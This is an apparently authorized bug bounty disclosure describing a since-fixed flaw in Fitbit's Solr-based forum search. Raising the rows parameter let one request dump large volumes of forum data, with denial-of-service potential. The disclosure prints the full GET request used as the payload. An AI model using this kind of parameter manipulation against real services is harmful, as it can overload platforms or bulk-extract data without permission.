```
Authorized Bug Bounty Disclosure
Disclosure Verification: Fitbit Authorized Disclosure on 03-09-2018
```
### Summary
Identified a method to queue up and download gigabytes, if not terabytes of data from Fitbit forums through one web request :flushed:

### Notes:
Fitbit was extremely responsive and resolved this in a timely manner :smiley:

### What
This is a location permission bug through Fitbit's implementation of solr/Lucene which enabled certain parameters to be manipulated.
It was super interesting to research that tech, which is detailed <a href="http://lucene.apache.org/solr/">here</a>.
Normally DOS (denial of service) is not within scope, however this was submitted as a general bug - with DOS potential ;)

### When
Bug discovered: 2016-05-05<br>
Bug Resolved: 2016-11-07

### How
Using the payload below at [fitbit.com/search/solrForum], the server request responds by dumping a specified amount of forum data:<br>
```
GET /search/solrForum?q=a&start=1&rows=9999&fq=(postStatus:0%20AND%20topicStatus:0) HTTP/1.1
Host: www.fitbit.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
```

### Where
It took a while to find the location, but though some research on the component, the services used were able to be identified. :sweat:

### Why
This is an issue where if utilized maliciously, could potentially cause a denial of service on the Fitbit platforms.

### Links
<a href="www.twitter.com/_eagleEggs">Twitter</a>
